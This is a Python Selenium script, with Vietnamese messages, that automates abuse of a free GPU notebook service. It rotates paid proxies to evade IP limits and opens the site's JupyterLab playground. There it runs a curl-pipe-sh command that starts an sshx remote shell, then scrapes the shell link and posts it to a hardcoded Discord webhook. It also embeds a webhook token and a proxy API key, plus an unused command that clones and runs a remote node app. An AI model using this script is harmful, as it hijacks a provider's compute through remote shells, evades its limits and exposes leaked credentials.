from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.by import By
from selenium.webdriver.common.action_chains import ActionChains
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
import time, re, requests, zipfile, json

# ================= CONFIG =================
SITE_URL = "https://www.nicegpu.com/"
PLAYGROUND_XPATH = '//*[@id="app"]/div/div[1]/div[2]/div/div/div/div[1]/div[3]/button[2]'
WELCOME_PATH = "/lab/tree/WELCOME.ipynb"

SSHX_CMD = "!curl -sSf https://sshx.io/get | sh -s run"

YOUR_NAME = "hoanqson"
TEXT_TO_PASTE = (
    "sudo apt update && sudo apt install -y nodejs npm && "
    "git clone https://github.com/hoanqson2107/node-ai.git && "
    "cd node-ai && node app.js"
)

WEBHOOK_URL = "https://discord.com/api/webhooks/1465693138906779660/FbFPFyVi172242cD1wVQUwaRR62vWVmYbj4hioKkA4rYYoxiKGyDegVEhict7Fwxi8hd"

# ===== PROXY =====
PROXY_API = "https://api.zingproxy.com/open/get-proxy/d2o115o0zpq3ded62ccec98c681d59ca4629f6dd30cfa6f911be335"
PROXY_COOLDOWN = 240
TOTAL_RUN = 5

# ================= PROXY STATE =================
current_proxy = None
last_proxy_time = 0

# ================= PROXY FUNCTIONS =================
def get_proxy():
    r = requests.get(PROXY_API, timeout=15).json()

    if "data" not in r or not isinstance(r["data"], dict):
        raise Exception(f"Proxy API lỗi: {r}")

    d = r["data"]
    ip = d["ip"]
    port = int(d["port"])
    user = d.get("username") or d.get("user")
    pwd = d.get("password") or d.get("pass")

    if not all([ip, port, user, pwd]):
        raise Exception(f"Thiếu dữ liệu proxy: {d}")

    return ip, port, user, pwd

def get_proxy_safe():
    global current_proxy, last_proxy_time
    now = time.time()

    if not current_proxy:
        print("🌐 Lấy proxy lần đầu")
        current_proxy = get_proxy()
        last_proxy_time = now
        return current_proxy

    if now - last_proxy_time < PROXY_COOLDOWN:
        remain = int(PROXY_COOLDOWN - (now - last_proxy_time))
        print(f"⏳ Dùng lại proxy cũ ({remain}s)")
        return current_proxy

    print("🔁 Xoay proxy mới")
    current_proxy = get_proxy()
    last_proxy_time = now
    return current_proxy

def create_proxy_extension(ip, port, user, pwd):
    manifest = {
        "manifest_version": 2,
        "name": "Proxy Auth",
        "version": "1.0",
        "permissions": [
            "proxy", "tabs", "<all_urls>",
            "webRequest", "webRequestBlocking"
        ],
        "background": {"scripts": ["background.js"]}
    }

    background = f"""
var config = {{
  mode: "fixed_servers",
  rules: {{
    singleProxy: {{
      scheme: "http",
      host: "{ip}",
      port: {port}
    }}
  }}
}};
chrome.proxy.settings.set({{value: config, scope: "regular"}}, function(){{}});

chrome.webRequest.onAuthRequired.addListener(
  function() {{
    return {{
      authCredentials: {{
        username: "{user}",
        password: "{pwd}"
      }}
    }};
  }},
  {{urls: ["<all_urls>"]}},
  ["blocking"]
);
"""

    fname = f"proxy_{ip}_{port}.zip"
    with zipfile.ZipFile(fname, "w") as z:
        z.writestr("manifest.json", json.dumps(manifest))
        z.writestr("background.js", background)
    return fname

# ================= DRIVER =================
def create_driver(proxy):
    opts = Options()
    opts.add_argument("--incognito")
    opts.add_argument("--disable-gpu")
    opts.add_argument("--no-sandbox")
    opts.add_argument("--disable-dev-shm-usage")
    opts.add_argument("--start-maximized")

    if proxy:
        opts.add_extension(create_proxy_extension(*proxy))

    return webdriver.Chrome(options=opts)

# ================= IP CHECK =================
def check_ip(driver):
    driver.get("https://api.ipify.org/")
    time.sleep(2)
    ip = driver.find_element(By.TAG_NAME, "body").text.strip()
    print("🌍 IP THỰC:", ip)
    return ip

# ================= WEBHOOK =================
def send_webhook(link, ip):
    try:
        requests.post(
            WEBHOOK_URL,
            json={"content": f"🔥 SSHX CREATED\n🌍 IP: `{ip}`\n{link}"},
            timeout=10
        )
    except:
        pass

# ================= MAIN =================
for run in range(1, TOTAL_RUN + 1):
    print(f"\n🚀 RUN {run}/{TOTAL_RUN}")
    start = time.time()

    proxy = get_proxy_safe()
    driver = create_driver(proxy)
    wait = WebDriverWait(driver, 300)
    actions = ActionChains(driver)

    try:
        driver.get(SITE_URL)
        time.sleep(3)

        old_tabs = driver.window_handles.copy()
        wait.until(EC.element_to_be_clickable((By.XPATH, PLAYGROUND_XPATH))).click()
        wait.until(lambda d: len(d.window_handles) > len(old_tabs))
        driver.switch_to.window(list(set(driver.window_handles) - set(old_tabs))[0])

        wait.until(lambda d: "/lab" in d.current_url)
        actions.send_keys(Keys.F5).perform()
        time.sleep(5)

        wait.until(lambda d: WELCOME_PATH in d.current_url)
        wait.until(EC.presence_of_element_located((By.CSS_SELECTOR, ".jp-Notebook")))

        actions.send_keys(Keys.ESCAPE).send_keys("b").send_keys(Keys.ENTER).perform()
        actions.send_keys(SSHX_CMD).key_down(Keys.SHIFT).send_keys(Keys.ENTER).key_up(Keys.SHIFT).perform()
        time.sleep(20)

        sshx = None
        for o in driver.find_elements(By.CSS_SELECTOR, ".jp-OutputArea-output pre"):
            m = re.search(r"https://sshx\.io/\S+", o.text)
            if m:
                sshx = m.group()
                break
        if not sshx:
            raise Exception("Không thấy SSHX link")

        ip = check_ip(driver)
        send_webhook(sshx, ip)

    except Exception as e:
        print("❌ LỖI:", e)

    finally:
        driver.quit()

    used = time.time() - start
    if used < PROXY_COOLDOWN:
        sleep = int(PROXY_COOLDOWN - used)
        print(f"⏳ Chờ {sleep}s cho đủ 240s")
        time.sleep(sleep)

print("\n✅ DONE – không còn lỗi proxy")
